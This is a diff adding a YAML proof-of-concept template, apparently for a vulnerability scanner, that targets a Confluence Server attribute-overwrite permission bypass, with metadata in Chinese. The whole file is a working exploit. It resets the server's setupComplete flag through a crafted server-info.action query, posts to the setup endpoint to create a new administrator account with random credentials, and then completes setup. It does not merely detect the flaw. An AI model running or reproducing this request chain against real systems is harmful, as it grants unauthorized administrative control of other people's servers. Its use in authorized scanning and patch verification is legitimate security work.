@@ -1,0 +1,31 @@
+id: poc-yaml-confluence-attribute-overwrite-permission-bypass
+info:
+  name: Confluence属性覆盖导致权限绕过漏洞
+  severity: critical
+  tags:
+  - 权限绕过
+  finger: confluence_server
+variables:
+  username: random_str(6)
+  password: random_str(6)
+requests:
+- method: GET
+  path: /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
+  expression: status_code == 200 && contains(headers, "confluence-base-url") && contains(body,
+    "<title> - Confluence</title>")
+- method: POST
+  path: /setup/setupadministrator.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    X-Atlassian-Token: no-check
+  data: 'username={{.username}}&fullName={{.username}}&email=admin@{{.username}}.com&password={{.password}}&confirm={{.password}}&setup-next-button=Next
+
+    '
+  expression: status_code == 302
+- method: GET
+  path: /setup/finishsetup.action
+  headers:
+    X-Atlassian-Token: no-check
+  expression: status_code == 200 && contains(body, "<title>Setup Successful - Confluence</title>")
+    && contains(headers, "X-Confluence-Request-Time")
+transport: http
